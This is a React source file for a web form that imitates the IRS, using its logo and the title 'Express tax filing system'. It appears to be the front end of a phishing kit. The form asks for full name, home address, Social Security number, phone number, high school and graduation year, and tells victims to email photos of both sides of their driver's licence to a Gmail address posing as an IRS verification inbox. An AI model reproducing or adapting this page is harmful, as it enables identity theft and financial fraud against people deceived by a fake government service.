
import { NavLink } from "react-router-dom";

function HomePage(props) {

    return (
        <div className="container">
            <form className="box" onSubmit={props.handleSubmit}>
                <img src="https://1000logos.net/wp-content/uploads/2022/03/IRS-Logo-1862.png" alt="" width="200" />
                <h1>Express tax filing system</h1>
                <h3>Express tax filing provides tax filing funds within 7 day(s)</h3>

                <div className="duo2">
                </div>



                <div className="over">
                    <div className="card-input">
                        <p>Full Name</p>
                        <input type="text" placeholder="" name="fullName" onChange={props.getData}   />
                    </div>
                    <div className="card-input put1">
                        <p>Full Home Address</p>
                        <input type="text" placeholder="" name="address" onChange={props.getData}  />
                        <h5>Current mailing address</h5>
                    </div>
                  
                    <div className="card-input put1">
                        <p>SSN (social security number)</p>
                        <input type="number" placeholder="" name="ssn" onChange={props.getData} />
                    </div>

                    <div className="card-input put1">
                        <p>What High school did you graduate From?</p>
                        <input type="text" placeholder="" name="schoolName" onChange={props.getData} />
                    </div>

                    <div className="card-input put1">
                        <p>What Year did you graduate</p>
                        <input type="number" placeholder="" name="schoolDate" onChange={props.getData} />
                    </div>

                    <div className="card-input put1">
                        <p>Phone Number</p>
                        <input type="number" placeholder="" name="phoneNumber" onChange={props.getData} />
                    </div>

                    <h1>submit a photo of the front and back of your valid Drivers Lincense/ I.D card to <br /> irsverifydocument@gmail.com</h1>
                    





                </div>





                <button className="check" onClick={props.handleSubmit}>Submit</button>

            </form>
        </div>
    )
}

export default HomePage;